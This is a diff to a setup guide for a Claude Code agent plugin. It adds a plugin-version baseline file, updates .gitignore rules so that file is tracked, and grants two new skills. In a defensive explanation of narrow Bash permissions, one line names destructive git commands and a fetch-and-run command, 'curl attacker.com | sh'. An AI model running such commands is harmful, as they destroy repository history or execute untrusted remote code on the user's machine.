@@ -362,6 +362,17 @@ mkdir -p "$KNOWLEDGE_ROOT"/{user/assets,concepts,memory,raw/{sessions,user,inbox
 mkdir -p "$PROJECTS_ROOT"
 ```
 
+**Record the template baseline.** Write `$HOME_DIR/.kevin/version.json` stamping the plugin version this home was scaffolded from. This is the anchor the SessionStart banner + dashboard use to detect pending HOME migrations, and the "from" point `/agent-kevin:upgrade` reconciles from. A fresh home equals the installed version, so it starts `current` (never falsely flagged). **Skip the write if the file already exists** (a re-init must not reset an upgrade-tracked baseline).
+
+```bash
+VERSION_FILE="$HOME_DIR/.kevin/version.json"
+if [ ! -f "$VERSION_FILE" ]; then
+  PLUGIN_VERSION=$(grep -o '"version"[[:space:]]*:[[:space:]]*"[^"]*"' "${CLAUDE_PLUGIN_ROOT}/.claude-plugin/plugin.json" | head -1 | sed 's/.*"\([^"]*\)"$/\1/')
+  TODAY=$(date +%Y-%m-%d)
+  printf '{\n  "templateVersion": "%s",\n  "initializedAt": "%s",\n  "history": []\n}\n' "$PLUGIN_VERSION" "$TODAY" > "$VERSION_FILE"
+fi
+```
+
 Note: do **not** create `.claude/skills/` here. Third-party skill libraries are installed via `/agent-kevin:configure-skills` after the user relaunches.
 
 Copy Kevin's avatar into `.claude/assets/` so it stays out of the way at the home root but is still resolvable from `IDENTITY.md`:
@@ -430,9 +441,9 @@ rm "$CLAUDE_DEST.bak"
 
 If `COLLISION="yes"`, note this for the Step 9 status block so the user knows Kevin wrote to `CLAUDE.local.md`. Claude Code auto-loads `.local.md` files alongside the main `CLAUDE.md`, so the user's existing instructions and Kevin's coexist — Kevin's `@-imports` cascade still pulls in the identity stack.
 
-Write a `.gitignore` so the home dir is safe to track in git out of the box. **Collision-aware**: if one already exists, don't overwrite — but append the Kevin-critical entries (`.claude/settings.local.json` holds API keys, `.kevin/*` ignores runtime tokens + logs while **tracking the `knowledge.json` compile cursor**, `.obsidian/workspace.json` churns on every Obsidian pane move) if they aren't already covered. The first two must be gitignored or the user will leak secrets / churn on every Kevin run; the third saves the operator from a dirty working tree every time they open the vault.
+Write a `.gitignore` so the home dir is safe to track in git out of the box. **Collision-aware**: if one already exists, don't overwrite — but append the Kevin-critical entries (`.claude/settings.local.json` holds API keys, `.kevin/*` ignores runtime tokens + logs while **tracking the `knowledge.json` compile cursor and the `version.json` template baseline**, `.obsidian/workspace.json` churns on every Obsidian pane move) if they aren't already covered. The first two must be gitignored or the user will leak secrets / churn on every Kevin run; the third saves the operator from a dirty working tree every time they open the vault.
 
-The compile cursor (`.kevin/knowledge.json`) is the *only* record of what's been ingested. Left fully gitignored it can be silently rolled back (iCloud, a restore, a fresh clone) and the next blind compile re-ingests everything and corrupts memory — so we track it while keeping the rest of `.kevin/` (tokens, logs) ignored.
+Two records inside `.kevin/` must survive a clone or restore, so we un-ignore them while keeping the rest (tokens, logs) ignored: the compile cursor (`.kevin/knowledge.json`) is the *only* record of what's been ingested — rolled back (iCloud, restore, fresh clone), the next blind compile re-ingests everything and corrupts memory; the template baseline (`.kevin/version.json`) records which plugin version this home's scaffolded files are reconciled to — lost, upgrade-tracking resets to onboarding and the "you're behind" signal breaks.
 
 ```bash
 if [ ! -f "$HOME_DIR/.gitignore" ]; then
@@ -446,7 +457,14 @@ else
   fi
   APPEND=""
   grep -qxF ".claude/settings.local.json" "$HOME_DIR/.gitignore" || APPEND="${APPEND}.claude/settings.local.json"$'\n'
-  grep -qxF ".kevin/*" "$HOME_DIR/.gitignore" || APPEND="${APPEND}.kevin/*"$'\n'"!.kevin/knowledge.json"$'\n'
+  if ! grep -qxF ".kevin/*" "$HOME_DIR/.gitignore"; then
+    # Fresh: ignore runtime state, but track the two records that must survive a clone.
+    APPEND="${APPEND}.kevin/*"$'\n'"!.kevin/knowledge.json"$'\n'"!.kevin/version.json"$'\n'
+  else
+    # Already ignores .kevin/* — re-add either negation if a legacy init missed it.
+    grep -qxF "!.kevin/knowledge.json" "$HOME_DIR/.gitignore" || APPEND="${APPEND}!.kevin/knowledge.json"$'\n'
+    grep -qxF "!.kevin/version.json" "$HOME_DIR/.gitignore" || APPEND="${APPEND}!.kevin/version.json"$'\n'
+  fi
   grep -qxF ".obsidian/workspace.json" "$HOME_DIR/.gitignore" || APPEND="${APPEND}.obsidian/workspace.json"$'\n'
   grep -qxF ".obsidian/cache/" "$HOME_DIR/.gitignore" || APPEND="${APPEND}.obsidian/cache/"$'\n'
   if [ -n "$APPEND" ]; then
@@ -647,8 +665,10 @@ Concrete approach: `Read` the existing file (treat as `{}` if absent), build the
       "Skill(agent-kevin:dashboard)",
       "Skill(agent-kevin:humanizer)",
       "Skill(agent-kevin:plan-spec)",
+      "Skill(agent-kevin:release)",
       "Skill(agent-kevin:setup-worktree)",
       "Skill(agent-kevin:simple-simplify)",
+      "Skill(agent-kevin:upgrade)",
       "Skill(agent-kevin:where-am-i)"
     ]
   }
@@ -668,7 +688,7 @@ Concrete approach: `Read` the existing file (treat as `{}` if absent), build the
 | Browser-gated | `perplexity_search`, `playwright_*`, `browser_flows` | configure-skills A.2b (Browser walk) |
 | Database-gated | `db_list`, `db_query`, `db_schema` | configure-skills A.2c (Database walk) |
 
-The allow list also carries six **skill** grants. Skills register regardless of permissions — the grant only suppresses the confirm prompt on model invocation (whether Kevin auto-fires the skill directly or one skill invokes another via the Skill tool). `Skill(agent-kevin:dashboard)`, `Skill(agent-kevin:where-am-i)`, and `Skill(agent-kevin:humanizer)` are **active**: all three are model-invocable (no `disable-model-invocation`). `dashboard` refreshes-and-opens the Agent OS dashboard on a plain "refresh the dashboard"; `where-am-i` answers "where am I" directly and is also invoked by `dashboard` and `sync` to freshen the session radar (one source of truth for the radar); `humanizer` fires when Kevin is asked to strip AI-writing tells from a draft. `Skill(agent-kevin:setup-worktree)`, `Skill(agent-kevin:plan-spec)`, and `Skill(agent-kevin:simple-simplify)` are **latent**: all three currently set `disable-model-invocation` (slash-only — `/plan-spec`, `/simple-simplify`), so the grant does nothing until that flag is dropped; they're kept here so enabling model invocation needs no settings change.
+The allow list also carries eight **skill** grants. Skills register regardless of permissions — the grant only suppresses the confirm prompt on model invocation (whether Kevin auto-fires the skill directly or one skill invokes another via the Skill tool). `Skill(agent-kevin:dashboard)`, `Skill(agent-kevin:where-am-i)`, and `Skill(agent-kevin:humanizer)` are **active**: all three are model-invocable (no `disable-model-invocation`). `dashboard` refreshes-and-opens the Agent OS dashboard on a plain "refresh the dashboard"; `where-am-i` answers "where am I" directly and is also invoked by `dashboard` and `sync` to freshen the session radar (one source of truth for the radar); `humanizer` fires when Kevin is asked to strip AI-writing tells from a draft. `Skill(agent-kevin:setup-worktree)`, `Skill(agent-kevin:plan-spec)`, `Skill(agent-kevin:simple-simplify)`, `Skill(agent-kevin:upgrade)`, and `Skill(agent-kevin:release)` are **latent**: all currently set `disable-model-invocation` (slash-only — `/plan-spec`, `/simple-simplify`, `/upgrade`, `/release`), so the grant does nothing until that flag is dropped; they're kept here so the slash invocation never prompts. `upgrade` applies pending HOME migrations after a `/plugin update`; `release` (producer-only) cuts a versioned release + CHANGELOG entry.
 
 **Why the Bash entries are scoped this narrowly:** broad patterns like `Bash(git *)` or `Bash(curl *)` would also authorize destructive forms (`git push --force`, `git reset --hard`, `curl attacker.com | sh`). The patterns above cover the read-mostly + scaffold-creation commands core skills actually use (`git log/status/diff/config`, `date`, `readlink`, `ls`, `find`, `cat`, `mkdir -p`, `test`, `echo`) — nothing that mutates source-control state or hits the network. **Network/curl is intentionally NOT pre-granted anywhere** — `wordpress-rest` and any other skill that makes outbound HTTP confirms on first call; the user picks "Always allow" to lock the grant to their actual URL pattern (much tighter than blanket `Bash(curl *)`).
 
